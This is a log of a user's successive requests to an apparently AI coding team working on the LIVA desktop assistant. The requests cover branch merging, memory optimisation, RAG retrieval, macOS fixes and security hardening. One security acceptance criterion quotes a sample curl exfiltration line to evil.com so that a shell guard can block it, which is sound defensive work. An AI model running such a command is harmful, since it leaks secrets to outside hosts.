# Original User Request

## Initial Request — 2026-06-10T03:39:38Z

Dự án này nhằm mục đích đồng bộ hóa các cải tiến, tối ưu hóa và cấu hình tương thích macOS (Apple Silicon) từ nhánh `mac` sang nhánh `main` của dự án LIVA, giải quyết các xung đột (nếu có), nâng cấp và tối ưu hóa hệ thống để chạy ổn định trên nhánh `main`.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

## Requirements

### R1. Đồng bộ và Hợp nhất nhánh `mac` vào `main`
- Chuyển sang nhánh `main` (hoặc đồng bộ mã nguồn) và hợp nhất toàn bộ thay đổi tối ưu hóa macOS từ nhánh `mac` vào `main`.
- Giải quyết triệt để tất cả các xung đột mã nguồn phát sinh trong quá trình merge.

### R2. Tối ưu hóa và Nâng cấp Hệ thống trên `main`
- Nâng cấp môi trường và tối ưu hóa hiệu năng runtime (speculative decoding, prompt caching, preemptive VRAM mutex, memory dreaming pipeline) trên `main`.
- Đảm bảo toàn bộ cấu hình hoạt động trơn tru trên Apple Silicon (Metal).

### R3. Kiểm thử và Xác minh (E2E & Unit Test)
- Đảm bảo tất cả các test suites (`vitest` ở gateway và `pytest` ở python engine) đều vượt qua 100% trên nhánh `main` sau khi đồng bộ.

## Acceptance Criteria

### Tính đồng bộ và Biên dịch
- [ ] Nhánh `main` được cập nhật đầy đủ các tính năng tối ưu cho macOS (Metal acceleration, speculative decoding, preemptive VRAM mutex, v.v.).
- [ ] Biên dịch TypeScript (`npm run build` hoặc `tsc`) thành công không có lỗi trong thư mục `liva-gateway`.
- [ ] Python native engine chạy ổn định với Python 3.11.8 và không gặp lỗi import/syntax.

### Kiểm thử và Độ ổn định
- [ ] Chạy lệnh test `npm run test` (hoặc `vitest`) trong `liva-gateway` vượt qua 100% các test suites.
- [ ] Chạy các bài test Python trong `liva-ai-engine` (`pytest`) vượt qua 100% các test suites.
- [ ] Khởi chạy thử nghiệm (qua gRPC) thành công giữa gateway và native engine trên macOS.

## Follow-up — 2026-06-10T03:44:17Z

The user has added a new requirement for the team:
Please update the requirements and acceptance criteria of the project to include updating technical documentation (especially `AI_CONTEXT.md` and any related architecture files) to ensure they are synchronized with the macOS updates and optimal configurations merged into the `main` branch.

Additional Requirements to add:
### R4. Cập nhật Tài liệu Kiến trúc và Kỹ thuật
- Cập nhật tài liệu `AI_CONTEXT.md` và các tài liệu kiến trúc liên quan khác để đồng bộ với các nâng cấp, tối ưu hóa và cấu hình mới trên nhánh `main`.
- Đảm bảo các chỉ số GitNexus, cấu hình môi trường, và các thay đổi kiến trúc được phản ánh chính xác trong tài liệu.

Additional Acceptance Criteria to add:
### Tài liệu kỹ thuật
- [ ] Tài liệu `AI_CONTEXT.md` được cập nhật chính xác và đồng bộ các thay đổi kiến trúc và cấu hình trên nhánh `main`.
- [ ] Các tài liệu kiến trúc liên quan khác được cập nhật đầy đủ thông tin về các cải tiến tối ưu hóa mới.

## Follow-up — 2026-06-10T05:04:45Z

Nghiên cứu và đề xuất phương án tối ưu hóa lượng RAM và VRAM cần thiết cho dự án LIVA để chạy mượt mà trên đa tầng phần cứng (bao gồm GPU 6GB/8GB VRAM, RAM 8GB/16GB, và Apple Silicon M1/M2 Unified Memory).

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

## Requirements

### R1. Phân tích chi tiết VRAM Footprint
Phân tích sâu cơ chế sử dụng và quản lý VRAM hiện tại trong LIVA, bao gồm:
- Cơ chế Sequential Hot-Swap (`PreemptiveVramMutex`, `ModelOrchestrator`, cooldown TTL, v.v.).
- Mức tiêu thụ VRAM của Router model (4B) và Expert model (26B).
- VRAM tiêu thụ bởi Avatar WebGL render loop (`use3DModel.ts`, `WidgetApp.vue`, các cơ chế demote/eco/freeze/preempt).
- Đề xuất các giải pháp giảm thiểu và tối ưu hóa VRAM để hoạt động tốt trên GPU 6GB/8GB VRAM (ví dụ: mô hình quantization tối ưu hơn, tinh chỉnh tham số llama-server, điều khiển bộ nhớ cache KV).

### R2. Phân tích chi tiết RAM Memory Usage
Phân tích mức độ tiêu thụ RAM của Node.js main process và các thành phần phụ trợ:
- Các instance `lru-cache` hiện tại (SemanticCache, SkillRegistry, MemoryManager, v.v.) và cấu hình giới hạn.
- Cơ chế cache và mmap của SQLite trong `StructuredMemory.ts` và `StorageProvider.ts`.
- Mức tiêu thụ RAM của các Worker threads (EmbeddingWorker ONNX CPU, VADWorker, WakeWord, v.v.).
- Rò rỉ bộ nhớ (memory leaks) tiềm ẩn và cơ chế GC hiện tại.
- Đề xuất phương án giảm tải RAM để hỗ trợ máy có 8GB/16GB RAM và tối ưu hóa cho Apple Silicon M1/M2 (Unified Memory).

### R3. Xây dựng Kế hoạch Đánh giá & Công cụ Đo lường (Profiling/Benchmarking)
Đề xuất thiết kế một kịch bản đo lường hoặc công cụ profiling tự động nhằm:
- Theo dõi biến động RAM và VRAM theo thời gian thực tương ứng với các trạng thái của Agent Loop (Idle, Chitchat, Expert Hot-Swap, Tool Execution, Voice Activity).
- Đánh giá định lượng hiệu quả của các giải pháp tối ưu hóa trước và sau khi áp dụng.

## Acceptance Criteria

### Báo cáo Nghiên cứu & Tối ưu hóa Bộ nhớ (`docs/research/ram_vram_optimization_report.md`)
- [ ] Báo cáo chi tiết, phân tích rõ ràng cấu trúc hiện tại của LIVA dựa trên source code thực tế (phải dẫn chiếu chính xác class/file như `ModelOrchestrator.ts`, `StructuredMemory.ts`, `use3DModel.ts`, v.v.).
- [ ] Đề xuất cụ thể các phiên bản quantization (ví dụ: Q4_K_M, IQ4_NL, v.v.) kèm theo ước lượng dung lượng VRAM tiết kiệm được và ảnh hưởng đến độ chính xác (perplexity/quality).
- [ ] Đề xuất cấu hình tối ưu cho SQLite (PRAGMA cache_size, mmap, wal_autocheckpoint) dành riêng cho cấu hình RAM thấp (8GB).
- [ ] Đề xuất phương án tối ưu hóa vòng đời Worker threads (lazy loading, auto-termination khi idle, v.v.) và quản lý LRU Cache để tránh phình RAM theo thời gian.
- [ ] Thiết kế kiến trúc hoặc mã giả (pseudocode) cho công cụ tự động đo lường và ghi log RAM/VRAM của LIVA.
- [ ] Báo cáo viết bằng Tiếng Việt (hoặc song ngữ), cấu trúc rõ ràng, mạch lạc, dễ hiểu đối với kỹ sư hệ thống.

## Follow-up — 2026-06-10T13:06:30Z

Implement Phase 2 "Enhancement — Quality Leap" upgrades for LIVA to establish a standardized RAG Ingestion Pipeline and improve retrieval quality via weighted RRF and query decomposition.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

## Requirements

### R1. Standardized RAG Ingestion Pipeline
- Build a singleton class `RAGIngestionPipeline` that manages document loading (PDF, Markdown, text), chunking (via `DocumentChunker`), batch embedding, and batch upserting into SQLite vector memory.
- Refactor `DocumentParser.ts` to call this pipeline and rename the skill to `ingest_document`, while keeping the old name `parse_document_pdf` as an alias for backward compatibility.

### R2. Route-Adaptive Weighted RRF
- Modify `searchHybridVectors` in `VectorRepository.ts` to accept weights for dense and sparse results.
- Scale RRF scores using these weights to optimize keyword precision vs semantic matching.

### R3. PromptBuilder Hybrid Search & Query Decomposition
- Update `PromptBuilder.ts` to retrieve memory context using hybrid search (`searchHybridVectors`) instead of vector-only search (`searchAnchorsWithScores`).
- Pass route-adaptive weights to RRF: factual queries prefer keyword matching (sparse weight 0.6), reasoning queries prefer semantic matching (dense weight 0.7).
- Implement rule-based query decomposition for ambiguous queries: split compound queries on conjunctions or punctuation, embed sub-queries in parallel, and merge results.

## Acceptance Criteria

### RAG Ingestion Pipeline
- [ ] `RAGIngestionPipeline` successfully parses, chunks, embeds, and saves Markdown and plain text files.
- [ ] PDF files are successfully parsed via worker thread, chunked, and saved.
- [ ] `DocumentParser.ts` exports metadata for `ingest_document` and successfully delegates to `RAGIngestionPipeline`.
- [ ] Unit tests verify ingestion of different file formats.

### Route-Adaptive Weighted RRF
- [ ] `searchHybridVectors` accepts a `weights` parameter and returns weighted scores.
- [ ] Results from weighted RRF contain the `createdAt` timestamp.
- [ ] Unit tests verify the weighted ranking outputs.

### Query Decomposition
- [ ] `PromptBuilder.ts` uses `searchHybridVectors` to retrieve context.
- [ ] Factual and reasoning queries use different RRF weight configurations.
- [ ] Ambiguous queries are split on Vietnamese/English conjunctions/punctuation into multiple sub-queries.
- [ ] Sub-queries are embedded in parallel, and their search results are merged, deduplicated, and sorted by score.
- [ ] Unit tests verify compound query splitting and merging.

## Follow-up — 2026-06-10T06:07:42Z

Nâng cấp và tích hợp cơ chế tối ưu hóa bộ nhớ RAM/VRAM cho trợ lý ảo LIVA dựa trên báo cáo nghiên cứu tại [ram_vram_optimization_report.md](file:///Users/duongnad/Documents/project/LIVA/docs/research/ram_vram_optimization_report.md).

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

## Requirements

### R1. Tối ưu hóa VRAM & Điều phối Mô hình Lớp Expert 12B
- Cấu hình và tích hợp tham số khởi chạy llama-server cho Expert Model (Gemma 4 12B QAT 4-bit) với mức chiếm dụng tĩnh ~6.0 GB VRAM và KV Cache tối ưu.
- Cập nhật cơ chế tráo đổi nóng tuần tự (Sequential Hot-Swapping) trong `ModelOrchestrator.ts` và quản lý mutex VRAM trong `PreemptiveVramMutex.ts`.
- Thiết lập cơ chế offload lớp (layer offloading) linh hoạt: offload 100% lên GPU ở cấu hình VRAM cao (12GB+) và offload lai (CPU/GPU) ở cấu hình VRAM thấp hơn (6GB/8GB).

### R2. Tinh chỉnh SQLite PRAGMA & Cơ chế Shielding I/O
- Cập nhật và áp dụng các thông số SQLite PRAGMA tối ưu trong `StructuredMemory.ts` (journal_mode = WAL, synchronous = NORMAL, mmap_size = 256MB, cache_size = -8192, wal_autocheckpoint = 500, page_size = 32768).
- Đảm bảo cơ chế Touch memory queue trong `EventRepository.ts` được debounded ghi gom nhóm dưới luồng phụ để bảo vệ ổ đĩa và tránh nghẽn I/O luồng chính.

### R3. Nâng cấp Giao diện WebGL Avatar & Đồ họa
- Tích hợp cơ chế tự động hạ FPS kết xuất của Avatar 3D VRM/FBX trong `use3DModel.ts` tương ứng với các trạng thái cửa sổ chạy ẩn (15 FPS), tiết kiệm năng lượng Eco (5 FPS), và đóng băng Freeze (0 FPS).
- Đảm bảo cơ chế giải phóng tài nguyên sâu (deep disposal) giải phóng hoàn toàn đỉnh (geometry), chất liệu (material), kết cấu (textures), xương (skeleton), và giải phóng ngay lập tức ngữ cảnh WebGL bằng `forceContextLoss()`.
- Làm mượt chuyển động theo dõi (spring-damped LookAt) và đồng bộ khẩu hình dựa trên năng lượng âm thanh (audio-driven lip-sync) theo mô hình RMS và dead zone đề xuất.

### R4. Triển khai TelemetryProfiler Giám sát Tài nguyên
- Phát triển thành phần `TelemetryProfiler` bằng TypeScript trong gateway để đo đạc Resident Set Size (RSS), Heap, External memory của Node.js, VRAM ước lượng của các mô hình LLM nạp trên GPU, và liên kết các thông số này với trạng thái hoạt động của `AgentLoopState`.
- Ghi log dữ liệu snapshot định kỳ (dạng JSON Lines) và cảnh báo bằng log console nếu phát hiện vượt ngưỡng an toàn quy định.

### R5. Đánh giá & Kiểm thử Hiệu năng
- Đảm bảo toàn bộ hệ thống biên dịch TypeScript thành công không có lỗi typecheck.
- Đảm bảo chạy vượt qua 100% các bài test hiện có trong suite kiểm thử bộ nhớ `liva-gateway/tests/memory/HMEMTestPlan.test.ts`.

## Acceptance Criteria

### Tính chính xác và Khả năng biên dịch
- [ ] Biên dịch toàn bộ phần gateway thành công (`npm run build` hoặc `tsc`) mà không có lỗi cú pháp hoặc kiểu dữ liệu.
- [ ] Toàn bộ 18/18 testcases trong tệp `liva-gateway/tests/memory/HMEMTestPlan.test.ts` vượt qua thành công sau khi tích hợp.

### Tối ưu hóa cấu hình VRAM & SQLite
- [ ] Tệp `ModelOrchestrator.ts` và `PreemptiveVramMutex.ts` cấu hình và xử lý đúng dung lượng footprint tĩnh mới của Gemma 4 12B QAT 4-bit (~6.7 GB VRAM).
- [ ] SQLite được thiết lập với đầy đủ các cấu hình PRAGMA đề xuất (WAL, NORMAL, mmap_size = 256MB, cache_size = -8192) tại thời điểm khởi tạo kết nối.
- [ ] Tệp `use3DModel.ts` tích hợp đầy đủ cơ chế deep disposal (bao gồm `renderer.forceContextLoss()`) và tự động điều tiết FPS.

### Component TelemetryProfiler
- [ ] Class `TelemetryProfiler` được khởi tạo, tự động thu thập snapshot định kỳ (mặc định 5s) và ghi log ra tệp `.jsonl` trong thư mục cấu hình.
- [ ] `TelemetryProfiler` đưa ra cảnh báo chính xác thông qua log console (`console.warn`) khi bộ nhớ RSS hoặc ước lượng VRAM vượt quá ngưỡng giới hạn được cấu hình.

## Follow-up — 2026-06-10T10:00:37Z

Research and implement comprehensive optimizations and upgrades across the LIVA hybrid-intelligence AI desktop assistant. LIVA is a production-grade, cross-platform (Windows + macOS) multi-agent AI desktop assistant with local/cloud LLM inference, 93 MCP skills, 4-tier memory system, and 3D WebGL avatar. The project has a tech-debt score of 95/100, indicating high code quality, but there are known improvement opportunities from recent research reports that remain unimplemented, plus potential optimizations not yet discovered. This is a **research-first** initiative: analyze deeply, then implement what is feasible and safe.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

**Critical context files to read FIRST:**
- `AI_CONTEXT.md` — Complete tech stack, architecture, banned libraries, coding standards, anti-patterns (1141 lines)
- `docs/research/LLM_AND_KNOWLEDGE_SYSTEM_RESEARCH_2026.md` — Recent research with 5 unimplemented upgrade proposals
- `docs/research/ram_vram_optimization_report.md` — RAM/VRAM optimization analysis and recommendations
- `docs/reports/LIVA_Architecture_Audit_2026.md` — Latest architecture audit
- `tech-debt-ledger.json` — Current tech debt score (95/100)

**Current branch:** `mac` (macOS development — all changes MUST stay on this branch, do NOT switch to `main`)

**Key monorepo components:**
- `liva-gateway/` — Node.js/TypeScript backend (Agent brain, FSM, memory, skills, security)
- `liva-ui/` — Vue 3 + Tauri v2 frontend (WebGL avatar, WebSocket UI)
- `liva-desktop/` — Tauri v2 Rust host (system tray, sidecar, transparent window)
- `liva-ai-engine/` — Python native engine (llama.cpp/MLX inference, gRPC, voice)

## Requirements

### R1. Research and Audit — Comprehensive Optimization Discovery

Perform a thorough analysis of all 4 LIVA components to identify every actionable optimization opportunity. This includes but is not limited to:

- **Unimplemented research items** from `docs/research/` (CRAG 3-Tier Scoring, FTS5 Unicode61, multilingual-e5-small migration, Document Chunker, Memory Provenance)
- **Performance bottlenecks** (event loop blocking, memory leaks, unnecessary allocations, slow startup paths)
- **Dead code and unused dependencies** across all packages
- **Architecture gaps** (missing error handling, inconsistent patterns, God Components with cyclomatic complexity ≥25)
- **macOS-specific optimization** opportunities (Metal GPU, Apple Silicon thread partitioning, Unified Memory management)
- **Test coverage gaps** in critical paths
- **Security hardening** opportunities beyond current ZMAS Guard

Produce a detailed research report documenting all findings, categorized by priority (P0 critical → P3 nice-to-have) with effort estimates.

### R2. Implementation — Upgrade What Is Feasible

Based on the research findings from R1, implement improvements that are safe, high-impact, and compatible with the existing architecture. All implementations must:

- Follow the coding standards in `AI_CONTEXT.md` strictly (no `console.log`, no `axios`, no `fs.readFileSync`, use `safeFetch()`, use `logger`, atomic writes, etc.)
- Not break existing test suites (`npx vitest run` must pass)
- Not introduce banned libraries or patterns
- Include appropriate unit tests for new code
- Update `AI_CONTEXT.md` if new modules, patterns, or architectural decisions are introduced

### R3. Documentation and Reporting

- Update `AI_CONTEXT.md` to reflect any new features, modules, or architectural changes implemented
- Produce a final summary report documenting: what was researched, what was implemented, what was deferred and why
- Update `tech-debt-ledger.json` with a new entry reflecting the post-optimization score

## Acceptance Criteria

### Research Quality
- [ ] Research report covers all 4 components (gateway, UI, desktop, AI engine)
- [ ] Each finding has a priority level (P0-P3), effort estimate, and blast radius assessment
- [ ] At least 15 unique optimization opportunities identified (spanning at least 3 of the 4 components)
- [ ] All 5 unimplemented research items from `LLM_AND_KNOWLEDGE_SYSTEM_RESEARCH_2026.md` are evaluated for feasibility

### Implementation Quality
- [ ] All implemented code follows the rules in `AI_CONTEXT.md` (no banned patterns, correct logging, atomic writes, safeFetch, etc.)
- [ ] `npx vitest run` passes with no regressions after changes
- [ ] Each implemented optimization has at least one unit test validating its behavior
- [ ] No new `any` types introduced in TypeScript code

### Documentation
- [ ] `AI_CONTEXT.md` is updated if any new modules or patterns are introduced
- [ ] Final report clearly separates "implemented" vs "researched but deferred" items with rationale
- [ ] `tech-debt-ledger.json` has a new timestamped entry

### Safety
- [ ] No changes to git branch (must remain on `mac`)
- [ ] No breaking changes to existing WebSocket protocol between gateway and UI
- [ ] No modifications to security layer (`SecurityGateway.ts`, `ZMAS_Guard.ts`) without documenting the change explicitly

## Follow-up — 2026-06-10T13:55:30Z

Analyze the LIVA codebase, identify and implement 3-5 safe, high-impact optimizations across Node.js gateway, Vue 3 UI, Tauri desktop host, or Python inference engine.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

Reference materials:
- AI_CONTEXT.md
- docs/reports/LIVA_Optimization_Research_Report_2026.md
- docs/research/LLM_AND_KNOWLEDGE_SYSTEM_RESEARCH_2026.md
- docs/research/ram_vram_optimization_report.md
- tech-debt-ledger.json

## Requirements

### R1. Optimization Audit & Selection
Perform a deep analysis of all LIVA components based on the reference reports and find additional optimization areas if any. Select 3-5 safe, high-impact optimization opportunities to implement.

### R2. Safe & Standardized Implementation
Implement the selected optimizations. All modifications must strictly adhere to the developer guidelines in `AI_CONTEXT.md` (no console.log, no axios, no blocking synchronous I/O, use safeFetch, use pino logger, perform atomic writes).

### R3. Verification & Gating
Verify the changes using the existing test suite (`npm run test:gateway`). Write new unit tests to validate the behavior of the implemented optimizations. Ensure there are no regressions.

### R4. Context & Ledger Sync
Update `AI_CONTEXT.md` to document any newly added modules, flags, or architectural shifts. Add a new timestamped entry in `tech-debt-ledger.json`.

## Acceptance Criteria

### Selection & Quality
- [ ] Document the selected 3-5 optimizations in a final report.
- [ ] No banned libraries or patterns (e.g., `console.log`, `axios`) are used.
- [ ] No new `any` types are introduced in the TypeScript codebase.

### Test Verification
- [ ] All existing test suites pass when running `npm run test:gateway`.
- [ ] At least one new test case/file is added and passes for each implemented optimization.

### Documentation & Tracking
- [ ] `AI_CONTEXT.md` is updated if new modules or environment flags are modified or introduced.
- [ ] `tech-debt-ledger.json` contains a new entry reflecting the updated status and score.

### Safety
- [ ] All development and commits remain strictly on the `mac` branch.


## Follow-up — 2026-06-10T16:28:50Z

LIVA is a hybrid-intelligence, multi-agent AI desktop assistant built with Tauri v2 + Node.js + Python. This project performs a comprehensive codebase audit, implements upgrades, optimizations, fixes specifically targeting macOS (Apple Silicon) on the `mac` branch, and implements a low-resource background/idle model unloading feature.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

> **MANDATORY**: Before writing ANY code, read `/Users/duongnad/Documents/project/LIVA/AI_CONTEXT.md` — it contains the complete tech stack, banned libraries, coding standards, and anti-patterns. Violations are REJECTED.

> **Branch rule**: You are on the `mac` branch. All work MUST stay on `mac`. Do NOT commit or push — staging (`git add`) is the boundary.

## Requirements

### R1. Critical macOS Platform Fixes

Fix platform-specific code that is broken or non-functional on macOS:

1. **PowerMonitorService.ts** — Currently uses Windows-only PowerShell commands (`Get-CimInstance Win32_Battery`). Eco Mode never activates on macOS. Add a `process.platform === 'darwin'` branch using `pmset -g batt` (same approach as `AutoGPUSetup.ts:120-124`).

2. **AgentLoop.ts barge-in snapshot path** — Hardcoded `E:\\AI_Models\\snapshots\\` (Windows path at ~L1542). Use `path.join(os.tmpdir(), 'liva_snapshots')` or a platform-agnostic path from ConfigManager.

3. **ModelOrchestrator.ts VRAM clearance delay** — The 500-1000ms CUDA GC delay is unnecessary on macOS Metal (unified memory). Auto-detect `process.platform === 'darwin'` and set delay to 0ms, saving ~1.5s per hot-swap cycle.

4. **VRAMGuard duplicated code in liva_native_engine.py** — `vram_guard_loop()` exists in both `LivaEngineWrapper` (~L862) and `LivaNativeEngine` (~L2113). The wrapper version lacks mutex locking. Remove the unsafe duplicate and ensure the wrapper delegates to the safe version.

5. **Heavy app detection list** — Add macOS-specific creative apps: Final Cut Pro, Logic Pro, Motion, Compressor, Parallels Desktop to the process whitelist.

### R2. Performance Optimizations for macOS

Optimize performance-critical paths for Apple Silicon:

1. **EmbeddingWorker batch inference** — Currently processes texts sequentially in a `for` loop (~L145-150). Implement true ONNX batch inference by concatenating token tensors for the entire batch.

2. **EmbeddingWorker return type** — L2 normalization returns `Array` instead of `Float32Array`, causing unnecessary type conversion in SemanticRouter. Return `Float32Array` directly.

3. **KokoroVoiceEngine CoreML** — ONNX device is hardcoded to `"cpu"` (L44-46). On Apple Silicon, add CoreML execution provider option for 2-4x TTS speedup.

4. **SemanticRouter anchor scan optimization** — Brute-force cosine scan over ~131 anchor vectors per query (L464-498). Implement centroid-per-route (mean pooling single vector per route) to reduce to ~13 comparisons.

5. **StreamSanitizer O(n) growth** — `fullContent.indexOf(pattern)` scans entire accumulated text on every token (L63-81). Track last-checked offset to make it O(1) amortized.

6. **AgentLoop fallback client caching** — `new OpenAI(...)` is instantiated on every fallback inference call (L834-845). Cache the fallback client instance.

7. **`onnxruntime-node` upgrade** — Update from v1.14 to latest (1.22+) for significant ARM64/Apple Silicon performance improvements.

### R3. Security Hardening

1. **Tauri Stronghold key derivation** — `lib.rs` L73-76 simply copies password bytes into a 32-byte array. This is NOT a proper KDF. Implement PBKDF2 or Argon2id for the Stronghold master key.

2. **SecurityGateway whitelist caching** — `isAllowedSender()` re-parses env and creates a new `Set` on every call (L108-123). Cache at construction with TTL refresh.

3. **ZMAS_Guard curl exfiltration gap** — Shell exfil patterns block `curl -d` but allow `curl` GET with data in URL params. Add pattern for URL-encoded data exfiltration.

4. **KokoroVoiceEngine audio_buffer event** — Missing `audio_buffer` binary event emission (only emits `audio_base64`). This means binary protocol optimization doesn't work with Kokoro fallback.

### R4. Code Quality & Architecture Improvements

1. **WidgetApp.vue decomposition** — At 1571 lines / 72KB, this is a god-component. Extract into composables: `useChat.ts`, `useAudioQueue.ts`, `useWidgetDrag.ts`, `useWidgetTheme.ts`.

2. **WidgetApp.vue WebSocket reconnection** — No reconnection handler (L720). If gateway restarts, widget goes dead. Add exponential backoff reconnection matching `useGateway.ts` pattern.

3. **useVoicePipeline.ts AudioWorklet migration** — Replace deprecated `ScriptProcessorNode` (L290) with `AudioWorkletNode` for off-main-thread audio processing.

4. **useVoicePipeline.ts transferable audio** — `Array.from(inputData)` copies Float32Array before posting to worker (L305). Use transferable objects to zero-copy.

5. **WidgetApp.vue interactive zones polling** — `setInterval(150ms)` polls DOM bounding rects (L703). Replace with `ResizeObserver` + `MutationObserver` for event-driven updates.

6. **ModelOrchestrator sync I/O** — Constructor uses `fs.existsSync()` / `fs.readFileSync()` (L107-124). Convert to async factory pattern.

7. **PreemptiveVramMutex queue sort** — `indexOf` in sort comparator is O(n²) (L82). Replace with stable index tracking or binary heap.

### R5. Start Script, Boot Crash Fix, & Low-Resource Background Unloading

1. **start_all.sh Boot Crash Fix** — The node gateway uses `process.stdin` end event (`process.stdin.on('end')`) to detect when the Tauri parent window closes and auto-kill all background sidecars. Using `npm run dev < /dev/null` in `scripts/start_all.sh` immediately triggers EOF, causing the gateway to shutdown right after booting. Keep stdin open for the gateway in development by reverting it to use `tail -f /dev/null | npm run dev >> "$PROJECT_ROOT/logs/gateway.log" 2>&1 &` or similar persistent stream.

2. **start_all.sh graceful shutdown** — Replace all `kill -9` with SIGTERM + 5s timeout fallback to SIGKILL.

3. **start_all.sh service logging** — Redirect service output to `logs/` directory instead of `/dev/null`.

4. **start_all.sh health checks** — Replace hardcoded `sleep` durations with health-check polling (curl retry to service ports).

5. **build_llama_mac.sh version pinning** — Pin llama.cpp to a specific commit hash for reproducible builds.

6. **tsconfig.json** — Add `incremental: true` for faster recompilation.

7. **Idle LLM Model VRAM/RAM Unloading** — To run LIVA in the background with the lowest resource footprint:
   - **liva_native_engine.py**: Implement `UnloadedEngine` (inheriting from `BaseEngine`) which returns empty/no-op responses. Update `EngineFactory.create_engine` and `LivaEngineWrapper.hot_swap_model` to handle `"unload"`, `"none"`, or `""` by shutting down the active engine, garbage collecting, clearing metal cache (`mx.metal.clear_cache()`), and loading `UnloadedEngine`. Allow the gRPC `SwapModel` handler to accept empty paths and trigger this unload state.
   - **ModelOrchestrator.ts**: Implement an idle timer (`IDLE_UNLOAD_TIMEOUT_MS`, default 5 minutes / 300,000ms). Whenever the system is inactive (no chat inputs or API requests), trigger a gRPC `swapModel` request to `"unload"` to free all VRAM/RAM.
   - **AgentLoop.ts**: When a user request is received while the model is `"unloaded"`, trigger `ModelOrchestrator.ensureModelLoaded()` to reload the Router model (`swapToRouter()`) before starting the inference XState machine, reusing the existing dynamic wait loop.
   - **ModelOrchestrator Anomaly Check**: Adapt the health check ping loop to allow `alive=false` when intentionally unloaded, only triggering a restart if the gRPC service fails to respond entirely.

## Acceptance Criteria

### macOS Platform Fixes (R1)
- [ ] `PowerMonitorService.ts` correctly detects battery status on macOS using `pmset -g batt` and activates Eco Mode when unplugged or battery < 30%
- [ ] Barge-in snapshot path in `AgentLoop.ts` uses a platform-agnostic path that exists on macOS
- [ ] VRAM clearance delay is 0ms on macOS (`process.platform === 'darwin'`)
- [ ] Only ONE `vram_guard_loop()` implementation exists in `liva_native_engine.py` with proper mutex locking
- [ ] Heavy app detection includes at least 3 macOS-specific creative apps
- [ ] All R1 changes pass: `cd liva-gateway && npx vitest run --reporter=verbose 2>&1 | tail -20` (zero test failures)

### Performance (R2)
- [ ] `EmbeddingWorker.processEmbedBatch()` processes multiple texts in a single ONNX inference call (not sequential loop)
- [ ] `EmbeddingWorker` L2 normalization returns `Float32Array`
- [ ] SemanticRouter performs ≤20 cosine comparisons per route call (centroid approach)
- [ ] `StreamSanitizer` stop-pattern check uses offset tracking (does not scan from position 0)
- [ ] Fallback OpenAI client is cached (not re-instantiated per call)
- [ ] `onnxruntime-node` in `package.json` is version ≥1.20

### Security (R3)
- [ ] Stronghold key derivation in `lib.rs` uses PBKDF2 with ≥100,000 iterations or Argon2id
- [ ] `SecurityGateway.isAllowedSender()` does not call `process.env[...]` and `split(',')` on every invocation
- [ ] ZMAS_Guard blocks `curl 'https://evil.com/?data=secret'` pattern

### Code Quality (R4)
- [ ] `WidgetApp.vue` is under 800 lines after decomposition
- [ ] Widget WebSocket has reconnection with exponential backoff
- [ ] `useVoicePipeline.ts` does NOT contain `createScriptProcessor`
- [ ] `ModelOrchestrator` constructor contains zero `fs.*Sync` calls

### Start Script, Boot Fix, & Idle Unloading (R5)
- [ ] LIVA starts successfully on macOS without instant EOF shutdown when running `scripts/start_all.sh`
- [ ] `start_all.sh` does not contain bare `kill -9` without prior SIGTERM attempt
- [ ] `start_all.sh` logs service output to files (not `/dev/null`)
- [ ] `build_llama_mac.sh` pins llama.cpp to a specific git commit or tag
- [ ] When the system is idle for 5 minutes (or custom `IDLE_UNLOAD_TIMEOUT_MS`), `ModelOrchestrator` successfully triggers gRPC model unload, calling `UnloadedEngine` in Python to free up VRAM/RAM
- [ ] Receiving a new user message automatically reloads the Router model and processes it successfully
- [ ] Anomaly health check does not crash/restart when the model is intentionally unloaded

## Follow-up — 2026-06-11T03:59:24Z

This project focuses on optimizing local inference response latency for the LIVA desktop assistant on macOS (Apple Silicon) to achieve real-time responsiveness (< 3 seconds). It addresses the root cause of the 10-20s delays: a gateway segfault (exit code 139) during Kokoro TTS fallback initialization, which forces expensive GPU/Metal cold-boots of the engine, combined with sub-optimal context recreation for KV cache clearing on GPU.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

> **MANDATORY**: Before writing ANY code, read `/Users/duongnad/Documents/project/LIVA/AI_CONTEXT.md` — it contains the complete tech stack, banned libraries, coding standards, and anti-patterns. Violations are REJECTED.

> **Branch rule**: You are on the `mac` branch. All work MUST stay on `mac`. Do NOT commit or push — staging (`git add`) is the boundary.

## Requirements

### R1. Fix Kokoro TTS Fallback Segfault on macOS
Fix the gateway crash during Kokoro TTS initialization which triggers SIGSEGV (exit code 139):
1. **Direct CPU Loading**: In KokoroVoiceEngine.ts, bypass the unsupported "coreml" device parameter attempt entirely on macOS. Load KokoroTTS directly on "cpu".
2. **Crash-Free Fallback**: Ensure that when the gateway fails to connect to the Python Edge-TTS service, it falls back to Kokoro smoothly without crashing the gateway process.

### R2. Optimize KV Cache Clearing on GPU/Metal
Optimize the local Python engine context reset during inference turns:
1. **Reuse llama.cpp Context**: In liva_native_engine.py (specifically within _generate_stream_unsafe), when is_gpu and is_dirty are true, use lib.llama_kv_cache_clear(self.ctx) instead of completely freeing and recreating the C++ context.
2. **Reallocation Overhead Avoidance**: Confirm that the context is cleared instantly without incurring Metal shader compilation or context recreation overhead on every turn.

## Acceptance Criteria

### Gateway Stability & Fallback
- [ ] Gateway no longer crashes (no exit code 139) during TTS fallback initialization
- [ ] Gateway runs continuously without restarting when transitioning to Kokoro local TTS
- [ ] Running test_kokoro.js or manual TTS testing succeeds on CPU

### Inference Performance
- [ ] liva_native_engine.py context is not recreated when clearing a dirty cache on GPU
- [ ] Initial token response latency is under 3 seconds for consecutive queries
- [ ] All existing gateway and engine tests pass: npm run test -w liva-gateway and python pytest suite

## Follow-up — 2026-06-11T04:09:24Z

I have run the gateway tests (all 232 test files/2518 tests passed) and the python pytest suite (83 passed, 4 skipped). Please proceed to finalize the staging, run the Victory Audit, and report back.


## Follow-up — 2026-06-11T04:27:17Z

# Teamwork Project Prompt — Draft

> Status: Launched
> Goal: Craft prompt → get user approval → delegate to teamwork_preview

